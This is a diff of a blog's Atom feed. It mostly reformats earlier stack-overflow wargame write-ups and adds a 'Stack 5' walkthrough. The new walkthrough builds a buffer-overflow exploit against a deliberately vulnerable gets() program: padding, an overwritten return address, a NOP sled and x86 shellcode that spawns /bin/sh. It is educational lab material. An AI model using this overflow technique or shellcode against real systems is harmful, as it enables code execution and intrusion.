@@ -4,7 +4,7 @@
   <title><![CDATA[punMag]]></title>
   <link href="http://tungpun.github.io/atom.xml" rel="self"/>
   <link href="http://tungpun.github.io/"/>
-  <updated>2015-08-13T19:55:00+00:00</updated>
+  <updated>2015-08-13T21:40:35+00:00</updated>
   <id>http://tungpun.github.io/</id>
   <author>
     <name><![CDATA[Tung Pun]]></name>
@@ -168,7 +168,7 @@ All done~ Restart your session and enjoy :D</p>
 </span><span class='line'>}</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 
-<p>Our goal is modify <code>modified</code>&rsquo;s value through <code>gets(buffer)</code> function. &ldquo;Sound fabulous, how can i change this variable&rsquo;s value when i cant touch it ?&rdquo;. However, when you use <a href="http://www.gnu.org/software/gdb/">gdb</a> to debug that file, you will recognize that <code>buffer</code>&rsquo;s address is just below <code>modified</code>&rsquo;s address in STACK. So, if we overload the <code>buffer</code>, the leftover will overwrite <code>modified</code> => the payload we need in this level is a string contains 70 * <code>A</code> (try more if you want).</p>
+<p>Our goal is modify <strong>modified</strong>&rsquo;s value through <strong>gets(buffer)</strong> function. &ldquo;Sound fabulous, how can i change this variable&rsquo;s value when i cant touch it ?&rdquo;. However, when you use <a href="http://www.gnu.org/software/gdb/">gdb</a> to debug that file, you will recognize that <strong>buffer</strong>&rsquo;s address is just below <strong>modified</strong>&rsquo;s address in STACK. So, if we overload the <strong>buffer</strong>, the leftover will overwrite <strong>modified</strong> => the payload we need in this level is a string contains 70 * <strong>A</strong> (try more if you want).</p>
 
 <h2>STACK 1</h2>
 
@@ -224,8 +224,8 @@ All done~ Restart your session and enjoy :D</p>
 </span><span class='line'>}</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 
-<p>Not only overload <code>buffer</code>, we need make <code>modified</code>&rsquo;s value same as <code>0x61626364</code> (equal to <code>dcba</code> in ascii).
-Cuz the execute environment belongs to Little Endiance system, so you must <code>pack('&lt;I', targetvalue)</code></p>
+<p>Not only overload <strong>buffer</strong>, we need make <strong>modified</strong>&rsquo;s value same as <strong>0x61626364</strong> (equal to <strong>dcba</strong> in ascii).
+Cuz the execute environment belongs to Little Endiance system, so you must <strong>pack(&lsquo;&lt;I&rsquo;, targetvalue)</strong></p>
 
 <div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -611,7 +611,72 @@ Cuz the execute environment belongs to Little Endiance system, so you must <code
 </span><span class='line'>[1]    50114 segmentation fault (core dumped)  ./stack4 &lt; input4.b</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 
+<h2>STACK 5</h2>
 
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/* stack5.c */
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;unistd.h&gt;
+</span><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;string.h&gt;
+</span><span class='line'>
+</span><span class='line'>int main(int argc, char **argv)
+</span><span class='line'>{
+</span><span class='line'>  char buffer[64];
+</span><span class='line'>
+</span><span class='line'>  gets(buffer);
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>There is not <strong>win()</strong> function, just two line for initialization and read input. &ldquo;Have you ever forgetten copying some thing ?&rdquo;</p>
+
+<p>Don&rsquo;t worry, it is the great chance for us to make friend with shellcode.
+We should overwrite EIP (using technique from previous challenge) in order to redirect program execution to our shellcode, which also was injected to input data.</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>payload = flushdata + bufaddr + nopdata + shellcode</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Easily to recognize that</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>flushdata = 'A' * 76</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p><strong>bufaddr</strong> points to shellcode&rsquo;s address in Stack. Using <strong>gdb</strong>, we have:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bufaddr = pack("&lt;I", 0xffffdbe0)</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p><strong>nopdata</strong> was used to avoid the different between the memory address inside gdb and outside.</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nopdata = "\x90" * 66</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<blockquote><p>What is <strong>shellcode</strong> ? Where should we find <strong>shellcode</strong> ?</p></blockquote>
+
+<p>We can build our shellcode through using <strong>msfvenom</strong> in msf framework.</p>
+
+<p>This is shellcode i using:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Combine all of them together and <strong>dd</strong> whatever you want :D</p>
 ]]></content>
   </entry>
   
